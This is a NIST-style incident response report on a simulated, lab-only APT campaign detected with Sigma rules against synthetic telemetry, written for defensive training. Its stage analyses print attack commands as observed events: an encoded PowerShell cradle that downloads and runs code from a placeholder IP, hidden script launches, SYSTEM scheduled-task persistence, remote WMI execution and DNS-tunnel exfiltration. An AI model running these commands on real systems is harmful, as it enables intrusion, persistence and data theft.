# Multi-Stage APT Incident Response Report

## 1. Executive Summary

This report documents the end-to-end incident handling lifecycle of a simulated multi-stage Advanced Persistent Threat (APT) campaign, structured in strict alignment with the **NIST SP 800-61r2 Computer Security Incident Handling Guide**.

The simulated intrusion traversed six sequential operational stages:
1. **Initial Access (T1566.001):** Malicious spear-phishing macro attachment spawning a hidden scripting interpreter.
2. **Execution (T1059.001):** Obfuscated Base64 PowerShell command downloading stage-two payloads.
3. **Persistence (T1053.005):** Scheduled task creation disguised as a system update service.
4. **Privilege Escalation (T1078 / T1134):** Unauthorized assignment of `SeDebugPrivilege` to a standard account.
5. **Lateral Movement (T1047 / T1021.002):** Remote WMI invocation and network logon across internal hosts.
6. **Data Exfiltration (T1071.004):** Covert data exfiltration over anomalous DNS TXT queries.

Using a lightweight, zero-dependency Python correlation engine ([`siem_engine.py`](../../APT-Simulation/simulation/siem_engine.py)) and seven modular Sigma detection rules, the simulation ingested 12 synthetic events (6 attack stages and 6 benign baseline events). The detection pipeline achieved a **100% True Positive Rate** (zero false negatives) and a **0% False Positive Rate** (zero false alarms). Harmless YARA training markers were verified using local YARA 4.5.5.

> [!IMPORTANT]
> **Simulation Scope & Telemetry Provenance Disclosure:**
> - **Synthetic Telemetry:** All log events, indicators, and hostnames (`LAB-WIN01`, `LAB-SRV01`, `192.0.2.50`) referenced in this report are **synthetic training artifacts** formatted in Elastic Common Schema (ECS) JSON Lines. No live production network intrusion or malware infection occurred.
> - **Offline Verification Architecture:** Due to host memory constraints (Windows 11 with 7.67 GB RAM), detection rules were executed via a standalone Python evaluation harness adhering to ECS and Sigma standards rather than heavy enterprise clusters.
> - **Operational Containment:** Containment and eradication protocols described herein represent **defensive recommendations and playbooks**, not commands executed on live production assets.
> - **Review Notice:** AI-assisted preparation was utilized; no independent human reviewer was assigned.

---

## 2. Incident Scope & Scenario Environment

| Parameter | Specification | Details / Evidentiary Context |
| :--- | :--- | :--- |
| **Incident Category** | Simulated APT Campaign | Multi-stage intrusion modeling MITRE ATT&CK techniques |
| **Primary Target (Patient Zero)** | `LAB-WIN01` | Fictional Windows 11 endpoint (User: `student`) |
| **Secondary Target (Lateral)** | `LAB-SRV01` | Fictional internal application/file server |
| **External Source Address** | `192.0.2.50` | RFC 5737 TEST-NET-1 documentation range (safe IP) |
| **Simulated C2 Infrastructure** | `exfil.training.lab` | Fictional destination domain for DNS exfiltration |
| **Telemetry Ingestion Tier** | Synthetic ECS JSONL | Windows Security Event IDs 4688, 4672, 4624 & Sysmon IDs 1, 22 |
| **Detection Engine** | Lightweight Python SIEM | Standard-library correlation & Lucene query evaluator |

---

## 3. Incident Response Lifecycle (NIST SP 800-61r2)

### 3.1 Phase 1: Preparation
Defensive controls and baseline telemetry standards were established prior to simulation:
1. **Sigma Rule Baseline:** Modular rules authored to detect parent-child anomalies, encoded script blocks, task creation, sensitive privilege assignment, network logons, and DNS tunneling.
2. **Cryptographic Baselines:** SHA-256 hashing applied to all input datasets and rules to guarantee integrity.
3. **ECS Normalization:** Standardized field definitions (`@timestamp`, `event.code`, `process.name`, `process.command_line`, `host.name`, `user.name`, `dns.question.name`).
4. **Threat Intelligence Readiness:** Candidate export templates prepared for TheHive 5 (API Case template) and MISP (Core JSON format).

---

### 3.2 Phase 2: Detection and Analysis

The correlation engine evaluated 12 synthetic events and produced 7 alert records. Six unique attack stages were identified. Two alert records were generated for Stage 2 because both the baseline rule (`apt-suspicious-powershell.yml`) and the standardized rule (`stage2-execution-encoded-powershell.yml`) matched the same invocation.

#### Kill Chain Progression Overview

| Stage | MITRE ATT&CK | Target Host | Technical Mechanism | Severity |
| :---: | :--- | :--- | :--- | :---: |
| **1** | **T1566.001** Phishing Attachment | `LAB-WIN01` | `WINWORD.EXE` spawns hidden `powershell.exe` executing `update.ps1` from Temp directory. | **HIGH** |
| **2** | **T1059.001** Encoded PowerShell | `LAB-WIN01` | `powershell.exe` executes Base64 payload downloading `http://192.0.2.50/a.ps1`. | **HIGH** |
| **3** | **T1053.005** Scheduled Task | `LAB-WIN01` | `schtasks.exe` creates task `WindowsUpdateCheck` targeting `updater.ps1` as `SYSTEM`. | **MEDIUM** |
| **4** | **T1078 / T1134** Privilege Escalation | `LAB-WIN01` | Windows Event ID 4672: `SeDebugPrivilege` assigned to non-admin user `student`. | **HIGH** |
| **5** | **T1047** Remote Management (WMI) | `LAB-SRV01` | Network logon 4624 Type 3 from `LAB-WIN01`; WMI spawns remote directory reconnaissance. | **HIGH** |
| **6** | **T1071.004** DNS Tunneling Exfiltration | `LAB-SRV01` | Sysmon Event ID 22 logs 68-character DNS TXT query transmitting Base64 data to `exfil.training.lab`. | **HIGH** |

#### Detailed Stage-by-Stage Analysis:

* **Stage 1: Initial Access (Event `APT-POS-001` | 09:00:15 UTC | `LAB-WIN01`):**
  - *Observed Execution:* `WINWORD.EXE` spawned `powershell.exe` with arguments:
    ```powershell
    powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File C:\Users\student\AppData\Local\Temp\update.ps1
    ```
  - *MITRE ATT&CK:* [T1566.001 Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) & [T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/)
  - *Detection Logic:* Sigma rule `stage1-initial-access-office-spawn.yml`. Word processing applications should never directly spawn hidden script interpreters.

* **Stage 2: Execution (Event `APT-POS-002` | 09:02:30 UTC | `LAB-WIN01`):**
  - *Observed Execution:* `powershell.exe` invoked with Base64 payload:
    ```powershell
    powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADUAMAAvAGEALgBwAHMAMQAnACkA
    ```
  - *Deobfuscated Payload:*
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.50/a.ps1')
    ```
  - *MITRE ATT&CK:* [T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/) & [T1027 Obfuscated Files](https://attack.mitre.org/techniques/T1027/)
  - *Detection Logic:* Sigma rules `apt-suspicious-powershell.yml` and `stage2-execution-encoded-powershell.yml`.

* **Stage 3: Persistence (Event `APT-POS-003` | 09:05:10 UTC | `LAB-WIN01`):**
  - *Observed Execution:* `schtasks.exe` invocation:
    ```cmd
    schtasks.exe /create /tn WindowsUpdateCheck /tr "powershell.exe -WindowStyle Hidden -File C:\Users\Public\updater.ps1" /sc onlogon /ru SYSTEM
    ```
  - *MITRE ATT&CK:* [T1053.005 Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
  - *Detection Logic:* Sigma rule `stage3-persistence-scheduled-task.yml`. Task masquerades as legitimate Windows Update service to ensure persistent SYSTEM execution.

* **Stage 4: Privilege Escalation (Event `APT-POS-004` | 09:08:45 UTC | `LAB-WIN01`):**
  - *Observed Telemetry:* Windows Security Event ID 4672 recorded privilege assignment:
    `PrivilegeList: SeDebugPrivilege, SeTcbPrivilege, SeAssignPrimaryTokenPrivilege` to standard user `student` via `consent.exe`.
  - *MITRE ATT&CK:* [T1078 Valid Accounts](https://attack.mitre.org/techniques/T1078/) & [T1134 Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)
  - *Detection Logic:* Sigma rule `stage4-privilege-escalation-sensitive-privilege.yml`. `SeDebugPrivilege` grant permits reading LSASS memory for credential harvesting.

* **Stage 5: Lateral Movement (Event `APT-POS-005` | 09:12:20 UTC | `LAB-SRV01`):**
  - *Observed Telemetry:* Network Logon (Logon Type 3) on internal server `LAB-SRV01` from `LAB-WIN01` (`192.0.2.50`), followed by remote WMI execution:
    ```cmd
    wmic /node:LAB-SRV01 process call create "powershell.exe -c Get-ChildItem C:\SharedData\"
    ```
  - *MITRE ATT&CK:* [T1047 Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) & [T1021.002 Remote Services: SMB](https://attack.mitre.org/techniques/T1021/002/)
  - *Detection Logic:* Sigma rule `stage5-lateral-movement-remote-wmi.yml`.

* **Stage 6: Exfiltration (Event `APT-POS-006` | 09:16:05 UTC | `LAB-SRV01`):**
  - *Observed Telemetry:* Sysmon Event ID 22 logged DNS query:
    `dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbi1zYW1wbGUtMDAx.exfil.training.lab` (Query Type: `TXT`, Length: `68`).
  - *Deobfuscated Subdomain:* `dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbi1zYW1wbGUtMDAx` decodes to: `test-data-exfiltration-sample-001`.
  - *MITRE ATT&CK:* [T1071.004 DNS](https://attack.mitre.org/techniques/T1071/004/) & [T1048 Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
  - *Detection Logic:* Sigma rule `stage6-exfiltration-dns-tunneling.yml`.

---

### 3.3 Phase 3: Containment Protocols

Recommended containment actions for deployment in an active intrusion:

1. **Host Isolation:** Issue EDR network containment commands for `LAB-WIN01` and `LAB-SRV01` to terminate lateral channels while maintaining analyst access.
2. **Active Directory Remediation:** Revoke Kerberos Ticket Granting Tickets (TGTs) and reset passwords for compromised user `student`. Terminate active SMB/WMI sessions from `LAB-WIN01`.
3. **Perimeter Controls:** Add `192.0.2.50` to edge firewall blocklists. Implement DNS sinkholing on internal resolvers for `*.exfil.training.lab`.

---

### 3.4 Phase 4: Eradication

1. **Persistence Removal:** Delete scheduled task via `schtasks.exe /delete /tn "WindowsUpdateCheck" /f`. Securely remove secondary payload files:
   - `C:\Users\student\AppData\Local\Temp\update.ps1`
   - `C:\Users\Public\updater.ps1`
2. **Process Scrubbing:** Terminate active PowerShell instances and restart WMI service hosts (`wmiprvse.exe`).
3. **Artifact Scanning:** Run YARA scans across `C:\Users\` and `C:\Windows\Temp\` using `apt_training_marker.yar` to verify zero residual binaries remain.

---

### 3.5 Phase 5: Recovery

1. **Re-imaging:** Re-image `LAB-WIN01` from verified golden images to prevent rootkit persistence. Restore `LAB-SRV01` shared files from clean offline backups.
2. **Credential Rotation:** Issue new MFA tokens and rotate local administrator credentials via Windows LAPS.
3. **Staged Reconnection:** Place restored hosts in monitored staging VLANs to confirm normal logging telemetry before returning to production.

---

### 3.6 Phase 6: Post-Incident Activity & Defensive Hardening

1. **Attack Surface Reduction (ASR):** Enable Defender ASR rule *"Block all Office applications from creating child processes"* (`D4F940AB-401B-4EFC-AADC-AD5F3C50688A`).
2. **PowerShell Hardening:** Enforce PowerShell Constrained Language Mode (CLM) via AppLocker/WDAC. Enable mandatory Script Block Logging (Event ID 4104) and transcription.
3. **DNS Response Policy Zones:** Configure internal DNS servers to throttle and alert on subdomains exceeding 50 characters with high alphanumeric entropy.

---

## 4. Chronological Incident Timeline

| Timestamp (UTC) | Event ID | Host | MITRE ATT&CK | Incident Event & Context |
| :---: | :--- | :--- | :--- | :--- |
| **09:00:15** | `APT-POS-001` | `LAB-WIN01` | T1566.001 / T1059.001 | User opens `invoice_march2026.docm`; `WINWORD.EXE` spawns hidden PowerShell script in Temp. |
| **09:02:30** | `APT-POS-002` | `LAB-WIN01` | T1059.001 / T1027 | PowerShell executes Base64 command downloading payload `a.ps1` from `192.0.2.50`. |
| **09:05:10** | `APT-POS-003` | `LAB-WIN01` | T1053.005 | `schtasks.exe` creates task `WindowsUpdateCheck` targeting `updater.ps1` with SYSTEM logon trigger. |
| **09:08:45** | `APT-POS-004` | `LAB-WIN01` | T1078 / T1134 | Event ID 4672: Non-admin user `student` assigned `SeDebugPrivilege` via UAC consent bypass. |
| **09:12:20** | `APT-POS-005` | `LAB-SRV01` | T1047 / T1021.002 | Network Logon 4624 Type 3 from `LAB-WIN01` to `LAB-SRV01`; WMI spawns remote directory scan. |
| **09:16:05** | `APT-POS-006` | `LAB-SRV01` | T1071.004 / T1048 | Sysmon 22 logs 68-character DNS TXT query transmitting Base64 data to `exfil.training.lab`. |

---

## 5. Technical Limitations & Defensibility Statement

1. **Simulated Scope:** Telemetry was generated using synthetic ECS JSONL events rather than live endpoint agent captures. The results demonstrate valid detection logic, but do not represent physical network compromise.
2. **Local SIEM Architecture:** Due to host memory boundaries (7.67 GB RAM), heavy multi-node enterprise stacks were not hosted live. Detections were executed using a zero-dependency Python correlation engine adhering to ECS and Sigma standards.
3. **Template Status:** Threat intelligence (MISP) and case management (TheHive) artifacts represent candidate configurations validated offline for schema compliance rather than live server database records.
